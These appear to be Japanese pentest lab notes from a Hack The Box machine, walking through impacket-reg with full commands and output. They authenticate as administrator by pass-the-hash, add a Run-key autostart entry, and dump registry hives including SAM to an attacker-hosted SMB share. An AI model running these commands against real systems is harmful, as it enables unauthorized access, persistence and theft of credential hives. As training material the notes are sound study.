## query
### query -keyName KEYNAME
```sh
└─$ impacket-reg -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.25.235' query -keyName HKCR
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Service RemoteRegistry is already running
HKCR
HKCR\*
HKCR\.386
HKCR\.a
HKCR\.accountpicture-ms
HKCR\.aif

~~~


└─$ impacket-reg -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.25.235' query -keyName HKCU
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Service RemoteRegistry is already running
HKCU
HKCU\Control Panel
HKCU\Environment
HKCU\Keyboard Layout
HKCU\Software


└─$ impacket-reg -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.25.235' query -keyName HKLM
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Service RemoteRegistry is already running
HKLM
HKLM\BCD00000000
HKLM\HARDWARE
HKLM\SAM
HKLM\SECURITY
HKLM\SOFTWARE
HKLM\SYSTEM


└─$ impacket-reg -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.25.235' query -keyName HKU 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Service RemoteRegistry is already running
HKU
HKU\.DEFAULT
HKU\S-1-5-19
HKU\S-1-5-20
HKU\S-1-5-18
```
### query -keyName KEYNAME -v VALUENAME
```sh
└─$ impacket-reg -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.25.235' query -keyName 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' -v 'VMware User Process' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Service RemoteRegistry is already running
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
        VMware User Process     REG_SZ   "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
```
### query -keyName KEYNAME -s
```sh
└─$ impacket-reg -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.25.235' query -keyName 'HKLM\Software\Microsoft\Windows\CurrentVersion' -s                           
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Service RemoteRegistry is already running
Software\Microsoft\Windows\CurrentVersion\AccountPicture\
Software\Microsoft\Windows\CurrentVersion\AccountPicture\Users\
Software\Microsoft\Windows\CurrentVersion\AdminDebug\
Software\Microsoft\Windows\CurrentVersion\AdminDebug\dcpromoui\
        LogFlags        REG_DWORD        0x1007c
Software\Microsoft\Windows\CurrentVersion\App Management\
Software\Microsoft\Windows\CurrentVersion\App Management\Publishers\
Software\Microsoft\Windows\CurrentVersion\App Management\Publishers\WSUS Publisher\
        (Default)       REG_SZ   {85074451-173D-4091-8648-C0E196BB363E}

~~~
```


## add
VALUETYPE are: REG_NONE, REG_SZ, REG_EXPAND_SZ, REG_BINARY, REG_DWORD, REG_DWORD_BIG_ENDIAN, REG_LINK, REG_MULTI_SZ, REG_QWORD
```sh
└─$ impacket-reg -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.25.235' add -keyName 'HKLM\Software\Microsoft\Windows\CurrentVersion\RUN' -v 'test' -vt 'REG_SZ' -vd 'C:\Windows\System32\cmd.exe' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Service RemoteRegistry is already running
Successfully set
        key     HKLM\Software\Microsoft\Windows\CurrentVersion\RUN\test
        type    REG_SZ
        value   C:\Windows\System32\cmd.exe
```


## delete
```sh
└─$ impacket-reg -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.25.235' delete -keyName 'HKLM\Software\Microsoft\Windows\CurrentVersion\RUN' -v 'test'                                         
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Service RemoteRegistry is already running
Successfully deleted key HKLM\Software\Microsoft\Windows\CurrentVersion\RUN\test
```


## save
保存フォルダの作成（レジストリ階層通りにフォルダを作成しないといけない）
```sh
└─$ mkdir -p Software/Microsoft/Windows/CurrentVersion

└─$ impacket-smbserver share . -smb2support
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```
指定したレジストリをkaliのsmbserverに保存
```sh
└─$ impacket-reg -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.25.235' save -keyName 'HKLM\Software\Microsoft\Windows\CurrentVersion\RUN' -o '\\10.10.16.18\share\'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Service RemoteRegistry is already running
[+] Dumping HKLM\Software\Microsoft\Windows\CurrentVersion\RUN, be patient it can take a while for large hives (e.g. HKLM\SYSTEM)
[*] Saved HKLM\Software\Microsoft\Windows\CurrentVersion\RUN to \\10.10.16.18\share\\Software\Microsoft\Windows\CurrentVersion\RUN.save
```
無事レジストリ保存
```sh
*] Incoming connection (10.129.25.235,58461)
[*] AUTHENTICATE_MESSAGE (\,FOREST)
[*] User FOREST\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:share)
^CTraceback (most recent call last):
  File "/usr/share/doc/python3-impacket/examples/smbserver.py", line 108, in <module>
    server.start()
    ~~~~~~~~~~~~^^
  File "/usr/lib/python3/dist-packages/impacket/smbserver.py", line 4934, in start
    self.__server.serve_forever()
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~^^
  File "/usr/lib/python3.13/socketserver.py", line 235, in serve_forever
    ready = selector.select(poll_interval)
  File "/usr/lib/python3.13/selectors.py", line 398, in select
    fd_event_list = self._selector.poll(timeout)
KeyboardInterrupt
^CTraceback (most recent call last):
  File "/usr/lib/python3.13/threading.py", line 1542, in _shutdown
    _thread_shutdown()
KeyboardInterrupt: 

                                                                                                                                                                       
└─$ ls Software/Microsoft/Windows/CurrentVersion/        
RUN.save
                                                                                                                                                                       

└─$ file Software/Microsoft/Windows/CurrentVersion/RUN.save 
Software/Microsoft/Windows/CurrentVersion/RUN.save: MS Windows registry file, NT/2000 or above
```


## backup
save と同じくsmbサーバにアップロードするが、エラーが出た
```sh
└─$ impacket-reg -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.25.235' backup -o '\\10.10.16.18\share\'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Service RemoteRegistry is already running
[+] Dumping HKLM\SAM, be patient it can take a while for large hives (e.g. HKLM\SYSTEM)
[*] Saved HKLM\SAM to \\10.10.16.18\share\\SAM.save
[+] Dumping HKLM\SYSTEM, be patient it can take a while for large hives (e.g. HKLM\SYSTEM)
[-] Couldn't save HKLM\SYSTEM: The NETBIOS connection with the remote host timed out.
[-] Error occurs while reading from remote(104)
[-] [Errno 32] Broken pipe
```
